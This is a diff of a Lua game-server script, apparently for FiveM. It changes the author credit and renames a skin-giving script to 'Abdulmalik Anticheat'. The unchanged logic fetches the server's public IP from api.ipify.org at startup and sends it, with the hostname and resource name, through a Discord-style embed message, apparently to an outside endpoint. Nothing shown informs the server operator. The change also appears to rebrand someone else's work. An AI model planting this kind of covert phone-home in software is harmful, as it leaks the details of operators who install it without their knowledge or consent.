@@ -7,7 +7,7 @@ function giveskinss(message)
           ["title"] = " Server Start with my script ",
           ["description"] = ""..message.."",
           ["footer"] = {
-          ["text"]= "[ Made By :  Toxic )#0028 ] [  "..os.date("%d/%m/%Y %I:%M %p").." ]",
+          ["text"]= "[ Made By :  Abdulmalik#1111 ] [  "..os.date("%d/%m/%Y %I:%M %p").." ]",
           ["icon_url"] = '',
            },
          }
@@ -19,7 +19,7 @@ function giveskinss(message)
     
  PerformHttpRequest("https://api.ipify.org/", function (err, text, head)
   local server_ip = text
-  giveskinss("**ServerName :**`"..GetConvar("sv_hostname").."`\n\n**Started T_GiveSkin Script :** `"..GetCurrentResourceName().."`\n\n**IP :**`"..server_ip.."`")
+  giveskinss("**ServerName :**`"..GetConvar("sv_hostname").."`\n\n**Started Abdulmalik Anticheat :** `"..GetCurrentResourceName().."`\n\n**IP :**`"..server_ip.."`")
   end, 'GET', '')
 
 RegisterServerEvent("2swshit:cleanareaveh")
